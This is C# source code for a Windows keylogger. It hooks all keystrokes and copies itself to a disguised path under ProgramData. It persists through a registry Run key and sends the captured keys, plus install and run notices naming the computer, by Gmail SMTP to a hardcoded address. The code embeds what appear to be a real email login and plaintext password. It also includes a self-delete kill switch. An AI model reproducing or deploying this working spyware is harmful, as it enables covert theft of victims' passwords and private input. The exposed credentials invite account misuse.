using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Net;
using Microsoft.Win32;
using System.IO;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string body = "";
    private static SmtpClient client = new SmtpClient()
    {
        Host = "smtp.gmail.com",
        Port = 587,
        EnableSsl = true,
        DeliveryMethod = SmtpDeliveryMethod.Network,
        UseDefaultCredentials = false,
        Credentials = new NetworkCredential("thewinner1301@gmail.com", "thewinner130198"),
        Timeout = 300000
    };

    private static void Main()
    {
        _hookID = SetHook(_proc);
        if (!File.Exists("C:\\ProgramData\\win32\\win32.exe"))
        {
            Directory.CreateDirectory("C:\\ProgramData\\win32");
            File.Copy(Application.ExecutablePath, "C:\\ProgramData\\win32\\win32.exe", true);
            SetAutorun(true);
            MailMessage instal_report = new MailMessage("thewinner1301@gmail.com", "terpilovskiy.egor@gmail.com", "The application was installed successfully", "Дата и время установки: " + DateTime.Now.ToLongDateString() + " " + DateTime.Now.ToLongTimeString() + ", Имя компьютера: " + Environment.MachineName);
            try
            {
                client.Send(instal_report);
            }
            catch (Exception)
            { }
        }
        if (Application.ExecutablePath == "C:\\ProgramData\\win32\\win32.exe")
        {
            Application.Run();
            MailMessage run_report = new MailMessage("thewinner1301@gmail.com", "terpilovskiy.egor@gmail.com", "The application was running successfully", "Дата и время запуска: " + DateTime.Now.ToLongDateString() + " " + DateTime.Now.ToLongTimeString() + ", Имя компьютера: " + Environment.MachineName);
            try
            {
                client.Send(run_report);
            }
            catch (Exception)
            { }
            UnhookWindowsHookEx(_hookID);
        }
    }

    private static void SetAutorun(bool autorun)
    {
        RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
        string ExePath = "C:\\ProgramData\\win32\\win32.exe";
        if (autorun)
            reg.SetValue("win32", ExePath);
        else
            reg.DeleteValue("win32");
        reg.Close();
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        Kill();
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
        A:
            if (body.Length < 150)
                body += (Keys)vkCode + " ";
            else
            {
                MailMessage letter = new MailMessage("thewinner1301@gmail.com", "terpilovskiy.egor@gmail.com", "Дата и время нажатия клавиш: " + DateTime.Now.ToLongDateString() + ", " + DateTime.Now.ToLongTimeString() + ", Имя компьютера: " + Environment.MachineName, body);
                try
                {
                    client.Send(letter);
                }
                catch (Exception)
                { }
                body = "";
                goto A;
            }

            //Console.WriteLine((Keys)vkCode);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void Kill()
    {
        string desktopdir = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        if (File.Exists(desktopdir + @"\kill_win32.txt"))
        {
            SetAutorun(false);
            Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 & del " + Application.ExecutablePath);
            Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 0 & del " + desktopdir + @"\kill_win32.txt");
            Environment.Exit(0);
        }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

}